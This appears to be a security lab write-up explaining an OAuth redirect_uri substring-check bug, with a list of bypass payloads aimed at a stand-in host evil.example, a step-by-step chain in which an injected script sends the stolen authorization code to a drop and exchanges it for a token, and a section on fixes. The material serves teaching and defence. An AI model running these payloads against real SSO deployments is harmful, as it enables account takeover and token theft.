# Lab 24 — SSO

## The bug

```python
if REGISTERED not in target:
    return js({"error": "redirect_uri not registered"}, 400)
```

`in` instead of `==`. The registered URI only has to **appear somewhere** in
the one you supply — and the easiest place to put it is inside a query
parameter of a URL you control:

```
http://127.0.0.1:9241/p/cb?next=http://127.0.0.1:9240/callback
└──────── attacker's page ────────┘     └──── the registered URI ────┘
```

The authorization server is satisfied, and then sends the user — with a fresh
authorization code on the end of the URL — to the attacker.

## Why this class is so damaging

`redirect_uri` is where the credential is *delivered*. Every other check in
OAuth can be perfect and it does not matter: the server hands the code to
whatever address survived validation. That makes `redirect_uri` validation the
single highest-value thing to test on any OAuth or SAML deployment.

The bypasses to try, in the order they usually work:

```
https://app.acme.test.evil.example        prefix check
https://evil.example/?x=https://app.acme.test    substring check
https://app.acme.test@evil.example        userinfo — the host is evil.example
https://app.acme.test/../../redirect?to=  path traversal past the registered path
https://app.acme.test/open-redirect?to=   an open redirect on the real origin
https://app.acme.test%2f%2eevil.example   parser differential between check and fetch
http://app.acme.test                      scheme downgrade
//evil.example                            protocol-relative
https://app.acme.test:9999                port not checked
```

The fourth and fifth are the important ones on well-built targets: when
`redirect_uri` really is validated exactly, a redirector *on the allowed origin*
is enough, which is why an "informational" open redirect is not informational
when the site does SSO.

## The chain

```bash
# 1. a page that forwards its own query string to your drop
POST /page {"name":"cb","html":"<script>fetch('/collect?id=d1&c='+encodeURIComponent(location.search))</script>"}

# 2. the crafted authorize URL, sent to a signed-in user
POST /report {"url":"…/oauth/authorize?client_id=notes&state=xyz&redirect_uri=
              http%3A%2F%2F127.0.0.1%3A9241%2Fp%2Fcb%3Fnext%3Dhttp%3A%2F%2F127.0.0.1%3A9240%2Fcallback"}

# 3. read the code out of the drop
GET /collected?id=d1        → ?next=…&code=1a2b3c…&state=xyz

# 4. exchange it and use the token
POST /oauth/token {"code":"1a2b3c…"}   → access_token
GET  /api/profile  Authorization: Bearer …
```

**Percent-encode the whole `redirect_uri` value.** It contains `?`, `&` and `:`;
unencoded, its `&next=` becomes a parameter of the *authorize* request and the
attack silently targets the wrong URL.

## Reading redirects instead of following them

A browser follows `Location`; a test usually wants the 302 itself. That header
is where an authentication flow says who you are, where an open redirect proves
it accepts anything, and where the `Set-Cookie` that logs you in actually rides.

```bash
h5i websec replay req_N --session lab24 --no-follow \
    --set path=/oauth/authorize --set query.redirect_uri=…
```

`--no-follow` stops at the first redirect and reports its status and headers.
Make it a habit on any endpoint that 302s.

## The fix

* Compare `redirect_uri` to the registered value **exactly**, whole string,
  after canonicalising nothing. Register full URIs, not prefixes or patterns.
* Bind the code to the client and require PKCE (`code_challenge`), so a leaked
  code is useless without the verifier.
* Use and verify `state`, tied to the user's session, for CSRF on the callback.
* Make codes single-use and short-lived (this server does pop them — that is the
  one thing it gets right).
* Audit every open redirect on every allowed origin. In an SSO deployment they
  are authentication bugs.

## h5i technique

`--no-follow`; percent-encoding a URL-valued parameter before it becomes a
`--set` value; chaining browser-delivered data back into replays.
